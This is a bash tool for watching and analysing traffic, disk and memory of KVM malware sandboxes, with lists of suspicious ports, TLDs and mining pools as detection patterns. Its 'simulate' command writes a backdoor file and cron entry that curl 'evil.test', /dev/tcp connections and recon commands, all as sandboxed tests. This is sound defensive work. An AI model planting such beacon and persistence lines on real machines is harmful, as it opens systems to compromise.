#!/usr/bin/env bash

# VM Forensics — Live traffic monitoring and post-analysis for KVM malware sandboxes
# Usage: vm-forensics.sh <command> [options]
# Run 'vm-forensics.sh help' for full command list

set -euo pipefail

# --- Constants ---
SCRIPT_NAME="vm-forensics"
SCRIPT_VERSION="1.0.0"
FORENSICS_BASE="./forensics"
PID_DIR="/tmp/vm-forensics"
SUSPICIOUS_PORTS=(4444 5555 8888 1337 6666 9999 31337 3389)
SUSPICIOUS_TLDS=(".xyz" ".top" ".club" ".work" ".click" ".loan" ".gq" ".ml" ".cf" ".tk")
KNOWN_MINING_POOLS=("pool.minexmr" "xmrpool" "monerohash" "cryptonight" "coinhive" "stratum")

# --- Color Output ---
RED=""
GREEN=""
YELLOW=""
CYAN=""
BOLD=""
RESET=""

function color_init() {
    if [ -t 1 ]; then
        RED=$(tput setaf 1)
        GREEN=$(tput setaf 2)
        YELLOW=$(tput setaf 3)
        CYAN=$(tput setaf 6)
        BOLD=$(tput bold)
        RESET=$(tput sgr0)
    fi
}

function log_msg() {
    local level="$1"
    shift
    local msg="$*"
    local color=""

    case "$level" in
        INFO)   color="$GREEN" ;;
        WARN)   color="$YELLOW" ;;
        ERROR)  color="$RED" ;;
        PHASE)  color="${BOLD}${CYAN}" ;;
    esac

    echo "${color}[${level}]${RESET} ${msg}"
}

function die() {
    log_msg ERROR "$@"
    exit 1
}

function confirm() {
    local prompt="$1"
    echo -n "${YELLOW}${prompt} [y/N]${RESET} "
    read -r answer
    [[ "$answer" =~ ^[Yy]$ ]]
}

# --- Validation Helpers ---

function check_root() {
    if [[ $EUID -ne 0 ]]; then
        die "This script must be run as root (use sudo)"
    fi
}

function require_deps() {
    local dep missing=()
    for dep in "$@"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        die "Missing required commands: ${missing[*]} — install with: apt-get install tcpdump tshark wireshark-common qemu-utils"
    fi
}

function vm_exists() {
    virsh dominfo "$1" &>/dev/null
}

function require_vm() {
    local name="$1"
    if ! vm_exists "$name"; then
        die "VM '$name' does not exist"
    fi
}

function get_vm_state() {
    virsh domstate "$1" 2>/dev/null | head -1
}

function get_vm_ip() {
    local name="$1"
    local ip=""

    ip=$(virsh domifaddr "$name" --source agent 2>/dev/null \
        | awk '/ipv4/ {split($4,a,"/"); print a[1]}' \
        | grep -v '^127\.' | head -1) || true
    if [[ -n "$ip" ]]; then echo "$ip"; return; fi

    ip=$(virsh domifaddr "$name" --source lease 2>/dev/null \
        | awk '/ipv4/ {split($4,a,"/"); print a[1]}' \
        | grep -v '^127\.' | head -1) || true
    if [[ -n "$ip" ]]; then echo "$ip"; return; fi

    ip=$(virsh domifaddr "$name" --source arp 2>/dev/null \
        | awk '/ipv4/ {split($4,a,"/"); print a[1]}' \
        | grep -v '^127\.' | head -1) || true
    if [[ -n "$ip" ]]; then echo "$ip"; return; fi

    echo ""
}

function get_kvm_ssh_key_path() {
    local user_home
    if [[ -n "${SUDO_USER:-}" ]]; then
        user_home=$(eval echo "~${SUDO_USER}")
    else
        user_home="$HOME"
    fi
    echo "${user_home}/.ssh/kvm-manager"
}

# --- Forensics Helpers ---

function get_vm_mac() {
    virsh domiflist "$1" 2>/dev/null | awk 'NR>2 && NF{print $5}' | head -1
}

function get_vm_bridge() {
    local iface_type source
    iface_type=$(virsh domiflist "$1" 2>/dev/null | awk 'NR>2 && NF{print $2}' | head -1)
    source=$(virsh domiflist "$1" 2>/dev/null | awk 'NR>2 && NF{print $3}' | head -1)

    if [[ "$iface_type" == "network" ]]; then
        # Resolve libvirt network name to the actual bridge device
        virsh net-info "$source" 2>/dev/null | awk '/^Bridge:/{print $2}'
    else
        # Direct bridge attachment
        echo "$source"
    fi
}

function get_session_dir() {
    local name="$1"
    local ts
    ts=$(date '+%Y%m%d-%H%M%S')
    local dir="${FORENSICS_BASE}/${name}/${ts}"
    mkdir -p "$dir"
    echo "$dir"
}

function get_active_session_dir() {
    local name="$1"
    ls -1td "${FORENSICS_BASE}/${name}/"*/ 2>/dev/null | head -1
}

function save_pid() {
    local name="$1" label="$2" pid="$3"
    mkdir -p "$PID_DIR"
    echo "$pid" > "${PID_DIR}/${name}-${label}.pid"
}

function kill_by_label() {
    local name="$1" label="$2"
    local pidfile="${PID_DIR}/${name}-${label}.pid"
    if [[ -f "$pidfile" ]]; then
        local pid
        pid=$(cat "$pidfile")
        if kill -0 "$pid" 2>/dev/null; then
            kill "$pid" 2>/dev/null || true
            log_msg INFO "Stopped $label (PID $pid)"
        fi
        rm -f "$pidfile"
    fi
}

function is_dga_like() {
    local domain="$1"
    local label="${domain%%.*}"

    # Too short to judge
    [[ ${#label} -lt 4 ]] && return 1

    # Very long subdomain label
    [[ ${#label} -gt 20 ]] && return 0

    local vowels consonants digits
    vowels=$(echo "$label" | tr -cd 'aeiouAEIOU' | wc -c)
    consonants=$(echo "$label" | tr -cd 'bcdfghjklmnpqrstvwxyzBCDFGHJKLMNPQRSTVWXYZ' | wc -c)
    digits=$(echo "$label" | tr -cd '0-9' | wc -c)

    # All consonants, no vowels, length > 5
    [[ $vowels -eq 0 && $consonants -gt 5 ]] && return 0

    # High digit ratio (>30% of label is digits)
    [[ $digits -gt 0 && $(( digits * 3 )) -gt ${#label} ]] && return 0

    return 1
}

# --- Core Commands ---

function cmd_capture() {
    check_root
    if [[ $# -lt 1 ]]; then
        die "Usage: $SCRIPT_NAME capture <vm-name>"
    fi

    local name="$1"
    require_vm "$name"
    require_deps tcpdump virsh

    local state
    state=$(get_vm_state "$name")
    [[ "$state" == "running" ]] || die "VM '$name' must be running (current state: $state)"

    local mac bridge session_dir pcap_file
    mac=$(get_vm_mac "$name")
    bridge=$(get_vm_bridge "$name")
    session_dir=$(get_session_dir "$name")
    pcap_file="${session_dir}/capture.pcap"

    [[ -n "$mac" ]] || die "Cannot determine MAC for VM '$name'"
    [[ -n "$bridge" ]] || die "Cannot determine bridge for VM '$name'"

    log_msg INFO "Capturing traffic on $bridge for MAC $mac"
    log_msg INFO "Output: $pcap_file"

    tcpdump -i "$bridge" ether host "$mac" -w "$pcap_file" -U &
    local pid=$!
    save_pid "$name" "tcpdump" "$pid"

    log_msg PHASE "Capture running (PID $pid) — use '$SCRIPT_NAME stop $name' to stop"
    log_msg INFO "Session directory: $session_dir"
}

function cmd_live() {
    check_root
    if [[ $# -lt 1 ]]; then
        die "Usage: $SCRIPT_NAME live <vm-name>"
    fi

    local name="$1"
    require_vm "$name"
    require_deps tshark virsh

    local state
    state=$(get_vm_state "$name")
    [[ "$state" == "running" ]] || die "VM '$name' must be running (current state: $state)"

    local mac bridge
    mac=$(get_vm_mac "$name")
    bridge=$(get_vm_bridge "$name")

    [[ -n "$mac" ]] || die "Cannot determine MAC for VM '$name'"
    [[ -n "$bridge" ]] || die "Cannot determine bridge for VM '$name'"

    log_msg INFO "Live monitoring $name on $bridge (Ctrl+C to stop)"
    log_msg INFO "Filtering out SSH (port 22) management traffic"
    echo ""
    printf "${BOLD}%-10s %-17s %-17s %-7s %-40s${RESET}\n" \
        "TIME" "SOURCE" "DEST" "PORT" "DOMAIN/URI"
    printf "%-10s %-17s %-17s %-7s %-40s\n" \
        "----------" "-----------------" "-----------------" "-------" "----------------------------------------"

    tshark -i "$bridge" \
        -f "ether host $mac and not port 22" \
        -l \
        -T fields \
        -e frame.time_relative \
        -e ip.src -e ip.dst \
        -e tcp.dstport -e udp.dstport \
        -e dns.qry.name \
        -e http.host -e http.request.uri \
        -e tls.handshake.extensions_server_name \
        -E header=n -E separator='|' \
        2>/dev/null | while IFS='|' read -r time src dst tcp_port udp_port dns http_host http_uri tls_sni; do
        local color="$RESET"
        local port="${tcp_port:-$udp_port}"
        local domain="${dns:-${tls_sni:-${http_host:-}}}"

        # Skip empty lines
        [[ -z "$src" && -z "$dst" ]] && continue

        # Check for suspicious ports
        for sp in "${SUSPICIOUS_PORTS[@]}"; do
            [[ "$port" == "$sp" ]] && color="$RED"
        done

        # Check domain for DGA patterns
        if [[ -n "$domain" ]]; then
            if is_dga_like "$domain"; then
                color="$RED"
            fi

            # Check suspicious TLDs
            for tld in "${SUSPICIOUS_TLDS[@]}"; do
                [[ "$domain" == *"$tld" ]] && color="${YELLOW}"
            done

            # Check mining pools
            for pool in "${KNOWN_MINING_POOLS[@]}"; do
                [[ "$domain" == *"$pool"* ]] && color="$RED"
            done
        fi

        # Format URI if present
        local display="${domain:-}"
        [[ -n "$http_uri" && "$http_uri" != "/" ]] && display="${display}${http_uri}"

        # Truncate time to reasonable length
        local short_time="${time:0:8}"

        printf "${color}%-10s %-17s %-17s %-7s %-40s${RESET}\n" \
            "$short_time" "${src:-}" "${dst:-}" "${port:-}" "$display"
    done
}

function cmd_watch_all() {
    check_root
    if [[ $# -lt 1 ]]; then
        die "Usage: $SCRIPT_NAME watch-all <vm-name>"
    fi

    local name="$1"
    require_vm "$name"
    require_deps tcpdump tshark virsh

    # Start background capture
    cmd_capture "$name"

    # Trap Ctrl+C to clean up
    trap 'log_msg INFO "Stopping..."; cmd_stop "$name"; exit 0' INT TERM

    echo ""
    log_msg INFO "Starting live display (pcap capture running in background)..."
    echo ""

    # Run live display in foreground
    cmd_live "$name"
}

function cmd_stop() {
    local name="${1:-}"

    if [[ -z "$name" ]]; then
        # Stop all
        local count=0
        for pidfile in "${PID_DIR}"/*.pid; do
            [[ -f "$pidfile" ]] || continue
            local pid
            pid=$(cat "$pidfile")
            if kill -0 "$pid" 2>/dev/null; then
                kill "$pid" 2>/dev/null || true
                count=$((count + 1))
            fi
            rm -f "$pidfile"
        done
        log_msg PHASE "Stopped $count capture process(es)"
    else
        kill_by_label "$name" "tcpdump"
        kill_by_label "$name" "tshark"
        log_msg PHASE "Captures for '$name' stopped"
    fi
}

# --- Analysis Commands ---

function cmd_analyze() {
    if [[ $# -lt 1 ]]; then
        die "Usage: $SCRIPT_NAME analyze <pcap-file>"
    fi

    local pcap="$1"
    [[ -f "$pcap" ]] || die "PCAP file not found: $pcap"
    require_deps tshark

    log_msg PHASE "Analyzing $pcap"
    echo ""

    # 1. Summary stats
    log_msg INFO "=== Capture Summary ==="
    local pkt_count
    pkt_count=$(tshark -r "$pcap" -T fields -e frame.number 2>/dev/null | wc -l)
    local duration
    duration=$(tshark -r "$pcap" -T fields -e frame.time_relative 2>/dev/null | tail -1)
    echo "  Packets: $pkt_count"
    echo "  Duration: ${duration:-0}s"
    echo ""

    # 2. DNS query summary
    log_msg INFO "=== DNS Queries (top 30) ==="
    tshark -r "$pcap" -T fields -e dns.qry.name -Y "dns.flags.response == 0" 2>/dev/null \
        | grep -v '^$' | sort | uniq -c | sort -rn | head -30 \
        | while read -r count domain; do
            local flag=""
            if is_dga_like "$domain"; then
                flag=" ${RED}[DGA?]${RESET}"
            fi
            for tld in "${SUSPICIOUS_TLDS[@]}"; do
                [[ "$domain" == *"$tld" ]] && flag=" ${YELLOW}[SUS TLD]${RESET}"
            done
            printf "  %5s  %s%s\n" "$count" "$domain" "$flag"
        done
    echo ""

    # 3. Connection summary
    log_msg INFO "=== Top Connections (dst IP:port) ==="
    tshark -r "$pcap" -T fields -e ip.dst -e tcp.dstport \
        -Y "tcp.flags.syn == 1 && tcp.flags.ack == 0" 2>/dev/null \
        | grep -v '^$' | sort | uniq -c | sort -rn | head -20 \
        | while read -r count ip port; do
            local flag=""
            for sp in "${SUSPICIOUS_PORTS[@]}"; do
                [[ "$port" == "$sp" ]] && flag=" ${RED}[C2 PORT?]${RESET}"
            done
            printf "  %5s  %s:%s%s\n" "$count" "$ip" "$port" "$flag"
        done
    echo ""

    # 4. Suspicious port activity
    log_msg INFO "=== Suspicious Port Activity ==="
    local port_filter=""
    for sp in "${SUSPICIOUS_PORTS[@]}"; do
        [[ -n "$port_filter" ]] && port_filter+=" or "
        port_filter+="tcp.dstport == $sp or tcp.srcport == $sp"
    done
    local sus_count
    sus_count=$(tshark -r "$pcap" -Y "$port_filter" -T fields -e frame.number 2>/dev/null | wc -l)
    if [[ $sus_count -gt 0 ]]; then
        echo "  ${RED}Found $sus_count packets on suspicious ports${RESET}"
        tshark -r "$pcap" -Y "$port_filter" -T fields \
            -e frame.time_relative -e ip.src -e ip.dst -e tcp.dstport 2>/dev/null \
            | head -20 | while read -r time src dst port; do
                printf "    %8s  %s -> %s:%s\n" "$time" "$src" "$dst" "$port"
            done
    else
        echo "  None detected"
    fi
    echo ""

    # 5. HTTP requests
    log_msg INFO "=== HTTP Requests ==="
    local http_count
    http_count=$(tshark -r "$pcap" -Y "http.request" -T fields -e frame.number 2>/dev/null | wc -l)
    if [[ $http_count -gt 0 ]]; then
        tshark -r "$pcap" -Y "http.request" -T fields \
            -e http.request.method -e http.host -e http.request.uri -e http.user_agent \
            2>/dev/null | head -30 | while read -r method host uri ua; do
                printf "  %-6s %s%s\n" "$method" "$host" "$uri"
                [[ -n "$ua" ]] && printf "         UA: %s\n" "$ua"
            done
    else
        echo "  None detected"
    fi
    echo ""

    # 6. TLS SNI names
    log_msg INFO "=== TLS Server Names (SNI) ==="
    tshark -r "$pcap" -T fields -e tls.handshake.extensions_server_name \
        -Y "tls.handshake.type == 1" 2>/dev/null \
        | grep -v '^$' | sort | uniq -c | sort -rn | head -20 \
        | while read -r count sni; do
            printf "  %5s  %s\n" "$count" "$sni"
        done
    echo ""

    # 7. Data transfer summary
    log_msg INFO "=== Data Transfer (top talkers) ==="
    tshark -r "$pcap" -q -z conv,ip 2>/dev/null | tail -n +6 | head -15
    echo ""

    log_msg PHASE "Analysis complete"
}

function cmd_disk_diff() {
    check_root
    if [[ $# -lt 2 ]]; then
        die "Usage: $SCRIPT_NAME disk-diff <vm-name> <snapshot-name>"
    fi

    local name="$1" snap_name="$2"
    require_vm "$name"
    require_deps qemu-nbd virsh qemu-img

    local state
    state=$(get_vm_state "$name")
    [[ "$state" == "shut off" ]] || die "VM '$name' must be shut off for disk-diff (current state: $state)"

    # Verify snapshot exists
    virsh snapshot-info "$name" "$snap_name" &>/dev/null \
        || die "Snapshot '$snap_name' not found for VM '$name'"

    # Get disk path
    local disk_path
    disk_path=$(virsh domblklist "$name" 2>/dev/null | awk 'NR==3{print $2}')
    [[ -f "$disk_path" ]] || die "Cannot find disk: $disk_path"

    # Create temporary mount points and snapshot disk
    local mnt_current mnt_snap snap_disk
    mnt_current=$(mktemp -d /tmp/forensics-current-XXXX)
    mnt_snap=$(mktemp -d /tmp/forensics-snap-XXXX)
    snap_disk=$(mktemp /tmp/forensics-snap-XXXX.qcow2)

    # Cleanup trap
    trap 'umount "$mnt_current" 2>/dev/null; umount "$mnt_snap" 2>/dev/null; qemu-nbd --disconnect /dev/nbd0 2>/dev/null; qemu-nbd --disconnect /dev/nbd1 2>/dev/null; rm -rf "$mnt_current" "$mnt_snap" "$snap_disk"' EXIT

    log_msg INFO "Preparing disk images..."

    # Load NBD module
    modprobe nbd max_part=8

    # Mount current disk state
    qemu-nbd --connect=/dev/nbd0 "$disk_path" --read-only
    sleep 1
    mount -o ro /dev/nbd0p1 "$mnt_current" 2>/dev/null \
        || mount -o ro /dev/nbd0p2 "$mnt_current" 2>/dev/null \
        || die "Could not mount current disk — check partition layout"

    # Extract snapshot to temporary disk and mount
    log_msg INFO "Extracting snapshot '$snap_name' disk..."
    qemu-img convert -l "snapshot.name=$snap_name" -O qcow2 "$disk_path" "$snap_disk"
    qemu-nbd --connect=/dev/nbd1 "$snap_disk" --read-only
    sleep 1
    mount -o ro /dev/nbd1p1 "$mnt_snap" 2>/dev/null \
        || mount -o ro /dev/nbd1p2 "$mnt_snap" 2>/dev/null \
        || die "Could not mount snapshot disk — check partition layout"

    log_msg PHASE "Filesystem diff: snapshot '$snap_name' vs current state"
    echo ""

    printf "${BOLD}%-12s %s${RESET}\n" "STATUS" "FILE"
    printf "%-12s %s\n" "------------" "----------------------------------------"

    diff -rq "$mnt_snap" "$mnt_current" 2>/dev/null | head -500 | while read -r line; do
        case "$line" in
            "Only in ${mnt_current}"*)
                local file="${line#Only in }"
                file="${file/: //}"
                file="${file#${mnt_current}}"
                printf "${GREEN}%-12s${RESET} %s\n" "[NEW]" "$file"
                ;;
            "Only in ${mnt_snap}"*)
                local file="${line#Only in }"
                file="${file/: //}"
                file="${file#${mnt_snap}}"
                printf "${RED}%-12s${RESET} %s\n" "[DELETED]" "$file"
                ;;
            "Files "*"differ")
                local file
                file=$(echo "$line" | sed "s|Files ${mnt_snap}||; s| and .*||")
                printf "${YELLOW}%-12s${RESET} %s\n" "[MODIFIED]" "$file"
                ;;
        esac
    done

    echo ""
    log_msg PHASE "Disk diff complete"

    # Cleanup runs via EXIT trap
}

function cmd_dump_mem() {
    check_root
    if [[ $# -lt 1 ]]; then
        die "Usage: $SCRIPT_NAME dump-mem <vm-name>"
    fi

    local name="$1"
    require_vm "$name"

    local state
    state=$(get_vm_state "$name")
    [[ "$state" == "running" ]] || die "VM '$name' must be running for memory dump (current state: $state)"

    local session_dir dump_file
    session_dir=$(get_session_dir "$name")
    dump_file="${session_dir}/${name}-memory.dump"

    log_msg INFO "Dumping memory for '$name' (this may take a moment)..."

    virsh dump "$name" "$dump_file" --memory-only

    local size
    size=$(du -h "$dump_file" | cut -f1)
    log_msg PHASE "Memory dump saved: $dump_file ($size)"
    log_msg INFO "Analyze with: vol.py -f $dump_file linux.pslist"
}

function cmd_report() {
    if [[ $# -lt 1 ]]; then
        die "Usage: $SCRIPT_NAME report <session-dir>"
    fi

    local session_dir="$1"
    [[ -d "$session_dir" ]] || die "Session directory not found: $session_dir"

    local report_file="${session_dir}/report.txt"

    log_msg PHASE "Generating report for $session_dir"

    {
        echo "=============================================="
        echo "  VM Forensics Report"
        echo "  Generated: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "  Session:   $session_dir"
        echo "=============================================="
        echo ""

        # Include pcap analysis if capture exists
        if [[ -f "${session_dir}/capture.pcap" ]]; then
            echo "--- NETWORK ANALYSIS ---"
            echo ""
            # Strip ANSI colors for the report file
            cmd_analyze "${session_dir}/capture.pcap" 2>&1 | sed 's/\x1b\[[0-9;]*m//g'
            echo ""
        else
            echo "--- NETWORK ANALYSIS ---"
            echo "  No capture file found in this session."
            echo ""
        fi

        # Include memory dump info if present
        local memdump
        memdump=$(find "$session_dir" -name '*-memory.dump' 2>/dev/null | head -1)
        if [[ -n "$memdump" ]]; then
            echo "--- MEMORY DUMP ---"
            echo "  File: $memdump"
            echo "  Size: $(du -h "$memdump" | cut -f1)"
            echo ""
        fi

        echo "=============================================="
        echo "  End of Report"
        echo "=============================================="
    } > "$report_file"

    # Also display to stdout
    cat "$report_file"

    log_msg PHASE "Report saved: $report_file"
}

# --- Simulate Command ---

function cmd_simulate() {
    if [[ $# -lt 1 ]]; then
        die "Usage: $SCRIPT_NAME simulate <vm-name>"
    fi

    local name="$1"
    require_vm "$name"
    require_deps virsh ssh scp

    local state
    state=$(get_vm_state "$name")
    [[ "$state" == "running" ]] || die "VM '$name' must be running for simulation"

    local ip
    ip=$(get_vm_ip "$name")
    [[ -n "$ip" ]] || die "Cannot detect IP for '$name' — wait for boot or check network"

    if ! confirm "This will generate known-bad traffic patterns inside VM '$name' for testing. Continue?"; then
        return
    fi

    log_msg PHASE "Deploying test payload to $name ($ip)"

    # Create test script
    local test_script
    test_script=$(mktemp /tmp/forensics-sim-XXXX.sh)

    cat > "$test_script" <<'SIMEOF'
#!/usr/bin/env bash
# VM Forensics — Simulated Malicious Activity
# These are SAFE test patterns using non-routable domains and localhost
set -euo pipefail

echo "[SIM] === Starting simulated malicious activity ==="
echo "[SIM] All traffic is safe — using .invalid/.test TLDs and localhost"
echo ""

# 1. DNS lookups to suspicious-looking domains (non-routable, safe)
echo "[SIM] Phase 1: DNS queries to suspicious domains..."
for domain in \
    "testdomain.invalid" \
    "c2-callback.test.invalid" \
    "aabbccddeeff11223344.xyz" \
    "xkjhg7f8d9s0a2m3n4b5.top" \
    "data-exfil.malware.test" \
    "update-check.totally-legit.invalid" \
    "cdn-assets-loader.click"; do
    echo "  -> Resolving $domain"
    nslookup "$domain" 2>/dev/null || true
    dig "$domain" 2>/dev/null || true
done
echo ""

# 2. Connection attempts to C2 ports (localhost only, safe)
echo "[SIM] Phase 2: C2 port connection attempts..."
for port in 4444 5555 8888 1337; do
    echo "  -> Connecting to 127.0.0.1:$port"
    timeout 1 bash -c "echo test > /dev/tcp/127.0.0.1/$port" 2>/dev/null || true
done
echo ""

# 3. Suspicious file drops
echo "[SIM] Phase 3: Suspicious file drops in /tmp..."
echo '#!/bin/bash' > /tmp/.hidden_backdoor_test
echo 'curl http://evil.test/beacon' >> /tmp/.hidden_backdoor_test
echo "* * * * * /tmp/.hidden_backdoor_test" > /tmp/.cron_persist_test
mkdir -p /tmp/.cache_hidden_test
echo "exfiltrated_data_placeholder" > /tmp/.cache_hidden_test/data.bin
ls -la /tmp/.hidden_backdoor_test /tmp/.cron_persist_test /tmp/.cache_hidden_test/
echo ""

# 4. Cron persistence test (adds then immediately removes)
echo "[SIM] Phase 4: Cron persistence (safe — auto-cleaned)..."
(crontab -l 2>/dev/null; echo "# FORENSICS_TEST_MARKER * * * * * curl http://evil.test/beacon") | crontab - 2>/dev/null || true
echo "  -> Cron entry added (temporary)"
sleep 1
crontab -l 2>/dev/null | grep -v FORENSICS_TEST_MARKER | crontab - 2>/dev/null || true
echo "  -> Cron entry removed"
echo ""

# 5. Curl to suspicious-looking URLs (localhost, safe)
echo "[SIM] Phase 5: HTTP beacon simulation..."
curl -s -o /dev/null -m 2 -A "Mozilla/5.0 (compatible; TotallyLegitBot/1.0)" \
    http://127.0.0.1/ 2>/dev/null || true
curl -s -o /dev/null -m 2 \
    http://127.0.0.1/api/v1/exfil?data=base64encodedstuff 2>/dev/null || true
echo ""

# 6. Enumerate system info (common recon behavior)
echo "[SIM] Phase 6: System reconnaissance..."
whoami
hostname
uname -a
cat /etc/os-release 2>/dev/null | head -3
ip addr show 2>/dev/null | grep "inet " || true
cat /proc/cpuinfo 2>/dev/null | head -5 || true
echo ""

# Cleanup
echo "[SIM] Cleaning up test artifacts..."
rm -f /tmp/.hidden_backdoor_test /tmp/.cron_persist_test
rm -rf /tmp/.cache_hidden_test
echo ""

echo "[SIM] === Simulation complete ==="
echo "[SIM] Check your forensics output for detected activity"
SIMEOF

    # Deploy and execute
    local ssh_key_args=()
    local KVM_SSH_KEY
    KVM_SSH_KEY=$(get_kvm_ssh_key_path)
    [[ -r "$KVM_SSH_KEY" ]] && ssh_key_args=(-i "$KVM_SSH_KEY")
    local ssh_target="ubuntu@${ip}"

    local ssh_opts=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR)

    log_msg INFO "Uploading test script..."
    scp "${ssh_opts[@]}" "${ssh_key_args[@]}" \
        "$test_script" "${ssh_target}:/tmp/forensics-sim.sh"

    log_msg INFO "Executing simulation..."
    echo ""
    ssh "${ssh_opts[@]}" "${ssh_key_args[@]}" \
        "$ssh_target" "chmod +x /tmp/forensics-sim.sh && sudo /tmp/forensics-sim.sh && rm -f /tmp/forensics-sim.sh"

    rm -f "$test_script"

    echo ""
    log_msg PHASE "Simulation complete on '$name'"
    log_msg INFO "Run '$SCRIPT_NAME analyze <pcap-file>' to analyze captured traffic"
}

# --- Usage ---

function usage() {
    cat <<EOF
${BOLD}$SCRIPT_NAME $SCRIPT_VERSION${RESET} — VM forensic monitoring for malware analysis sandboxes

${BOLD}USAGE${RESET}
    $SCRIPT_NAME <command> [options]

${BOLD}LIVE MONITORING${RESET}
    capture <vm>                        Start background packet capture (pcap)
    live <vm>                           Live color-coded traffic display
    watch-all <vm>                      Combined capture + live display
    stop [vm]                           Stop capture processes (all if no vm specified)

${BOLD}ANALYSIS${RESET}
    analyze <pcap-file>                 Post-analysis of captured traffic
        DNS query summary, connection map, suspicious port detection,
        DGA domain flagging, HTTP/TLS extraction, data transfer stats
    disk-diff <vm> <snapshot>           Compare current disk state vs snapshot
    dump-mem <vm>                       Capture VM memory for Volatility analysis
    report <session-dir>                Generate summary report from session data

${BOLD}TESTING${RESET}
    simulate <vm>                       Run safe test patterns inside VM
        Generates: DNS to suspicious domains, C2 port connections,
        file drops, cron persistence, HTTP beacons, system recon

${BOLD}SUSPICIOUS INDICATORS${RESET}
    Ports:   ${SUSPICIOUS_PORTS[*]}
    TLDs:    ${SUSPICIOUS_TLDS[*]}
    Mining:  ${KNOWN_MINING_POOLS[*]}
    DGA:     label >20 chars, no vowels, high digit ratio

${BOLD}WORKFLOW EXAMPLE${RESET}
    # 1. Create a hardened sandbox
    kvm-manager.sh create sandbox --cloud-image --stealth
    kvm-manager.sh snap sandbox clean

    # 2. Start monitoring
    $SCRIPT_NAME watch-all sandbox

    # 3. Run suspicious code (another terminal)
    kvm-manager.sh ssh sandbox -- 'npm install suspicious-package'

    # 4. Stop and analyze
    $SCRIPT_NAME stop sandbox
    $SCRIPT_NAME analyze ./forensics/sandbox/<session>/capture.pcap

    # 5. Compare filesystem changes
    kvm-manager.sh stop sandbox
    $SCRIPT_NAME disk-diff sandbox clean

    # 6. Roll back and repeat
    kvm-manager.sh rollback sandbox clean

    # Test your setup first:
    $SCRIPT_NAME capture sandbox
    $SCRIPT_NAME simulate sandbox
    $SCRIPT_NAME stop sandbox
    $SCRIPT_NAME analyze ./forensics/sandbox/<session>/capture.pcap
EOF
}

# --- Main ---

function main() {
    color_init

    if [[ $# -lt 1 ]]; then
        usage
        exit 1
    fi

    local cmd="$1"; shift

    case "$cmd" in
        capture)    require_deps tcpdump virsh;         cmd_capture "$@" ;;
        live)       require_deps tshark virsh;          cmd_live "$@" ;;
        watch-all)  require_deps tcpdump tshark virsh;  cmd_watch_all "$@" ;;
        stop)                                           cmd_stop "$@" ;;
        analyze)    require_deps tshark;                cmd_analyze "$@" ;;
        disk-diff)  require_deps qemu-nbd virsh qemu-img; cmd_disk_diff "$@" ;;
        dump-mem)   require_deps virsh;                 cmd_dump_mem "$@" ;;
        report)                                         cmd_report "$@" ;;
        simulate)   require_deps virsh ssh scp;         cmd_simulate "$@" ;;
        help|--help|-h) usage ;;
        *)          die "Unknown command: $cmd — run '$SCRIPT_NAME help' for usage" ;;
    esac
}

main "$@"
